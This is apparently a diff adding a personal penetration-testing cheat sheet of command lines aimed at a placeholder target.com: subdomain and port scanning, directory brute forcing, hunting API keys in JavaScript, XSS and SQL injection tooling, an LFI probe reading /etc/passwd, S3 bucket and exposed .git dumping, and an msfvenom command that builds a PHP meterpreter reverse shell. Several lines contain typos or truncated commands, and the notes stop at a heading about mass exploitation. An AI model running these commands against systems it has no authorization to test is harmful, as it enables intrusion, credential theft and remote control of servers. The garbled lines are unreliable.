@@ -1,0 +1,78 @@
+1)subfinder
+2)subzy 
+
+subfinder = subfinder -d target.com -o sub.txt
+assetfinder = enum -passive -d target.com -o sub.txt
+Amass = --subs-only target.com >> sub.txt
+
+masscan = -p1-65535 --rate 10000 -oL masscan_results.txt target.com
+nmap = nmap -p- --open -sV -sC -T4 -oN nmap_result.txt taarget.com
+
+#screenshot capture for subdomains
+eyewitness -f subdomains.txt --web
+cat subdomain.txt | aquatone -out screenshots
+
+#directory brute forcing
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/medium.txt -o ffuf_results.txt
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt
+
+#javascript analysis
+api keys
+sensitive end-points
+authentication tokens
+hidden parameters
+tools = 1)Linkfinder = python3 linkfinder.py -i https://target.com/script.js -o results.html
+        2)gf = cat js_file.txt | gf apikeys > secrets.txt
+        
+#parameter discovry
+3)paramspider = python3 paramspider.py -d target.com --level high -o params.txt
+4)arjun -u https://target.com/api -m GET -o params.json
+
+#xss
+1)dalfox = cat params.txt | dalfox pipe -o xss_results.txt
+2)XSStrike = python3 XSStrike/xsstrike.py -u "https://target.com/index.php?serach=query"
+
+#sql
+sqlmap -u "https://target.com/index.php?id=1" --dbs --batch --random-agent
+
+#ssrf
+gopherus
+interactsh = for blind ssrf
+
+#LFI/RFI
+LFI(local file inclusion)
+RFI(remote file inclusion)
+1)lfisuit = python3 lfisuite.py -u "https://target.com/index.php?file=../../../etc/passwd"
+2)fimap = fimap -u "https://target.com/index.php?file=test"
+
+#open redirect
+python3 oralyzer.py -l urls.txt -p payloads.txt
+
+#security headers = protect like xss,click jacking,data injection
+1)nikto = nikto -h target.com
+2)httpx = httpx -u target.com -sc -title -server -o headers.txt
+
+#API
+1)postman
+2)kiterunner = kiterunner -u https://target.com -w wordlists/apis.txt
+
+#content discovery
+gau target.com | tee urls.txt
+waybackurls target.com > wayback.txt
+
+#s3 bucket enumeration
+AWSBucketDump = python3 AWSBucketDump.py -l target-buckets.txt -D
+
+#cms enumeration
+cmseek = python3 cmseek.py -u target.com
+
+#firewall
+wafwoof = wafw00f https://target.com
+
+#information disclosure detection
+gitdumper = python3 GitDumper.py https://target.com/.git /output-folder/
+
+#reverse shell generation
+msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f raw > shell.php
+
+#mass exploitation with metasploit
